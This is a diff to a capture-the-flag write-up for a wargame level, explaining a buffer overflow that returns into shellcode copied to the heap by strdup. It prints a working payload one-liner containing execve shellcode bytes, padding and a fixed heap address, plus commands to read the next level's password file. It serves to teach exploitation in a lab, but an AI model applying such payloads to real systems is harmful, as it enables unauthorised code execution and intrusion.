@@ -63,32 +63,23 @@ This prevents classic stack-based exploits! Stack addresses start with `0xbffff.
 
 ## 💣 Exploit Strategy
 
-### Step 1: Find Heap Address
+### Step 1: Analyze with Ghidra
+From the decompiled code we can see:
+- Buffer is **76 bytes**
+- **strdup()** copies our input to the heap
+- Stack address protection: blocks addresses starting with `0xb...`
+- **EIP offset**: 76 (buffer) + 4 (saved EBP) = **80 bytes**
+
+### Step 2: Find Heap Address (Runtime Check)
 ```bash
 ltrace ./level2
 # Input: AAAA
 # Output: strdup("AAAA") = 0x0804a008
 ```
 
-Or with GDB:
-```bash
-gdb level2
-(gdb) break *0x0804853d    # After strdup
-(gdb) run
-# Input: AAAA
-(gdb) info registers eax   # 0x804a008
-```
+The heap address is **`0x0804a008`** (predictable, no ASLR)
 
-### Step 2: Find EIP Offset
-```bash
-gdb level2
-(gdb) run
-# Input: Aa0Aa1Aa2Aa3...Ad2A (pattern)
-# Crash: 0x37634136
-# Offset: 80 bytes
-```
-
-### Step 3: Use Shellcode from Exploit-DB (24 bytes)
+### Step 3: Get Shellcode
 
 **Source**: [Exploit-DB Shellcode #42428](https://www.exploit-db.com/shellcodes/42428)  
 **Author**: Touhid M.Shaikh  
@@ -114,19 +105,19 @@ mov    al, 0x0b              # syscall 11 = execve
 int    0x80                  # Make syscall
 ```
 
-### Step 4: Calculate Payload
+### Step 4: Build the Exploit
 ```
 [Shellcode: 24 bytes] + [Padding: 56 bytes] + [Heap Address: 4 bytes]
-                                                    ↓
-                                               0x0804a008
+                                                     ↓
+                                                0x0804a008
 ```
 
-### Step 5: Execute Exploit
+Execute:
 ```bash
 (python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*56 + "\x08\xa0\x04\x08"'; cat) | ./level2
 ```
 
-### Step 6: Get the Flag
+### Step 5: Get the Flag
 ```bash
 whoami    # level3
 cat /home/user/level3/.pass
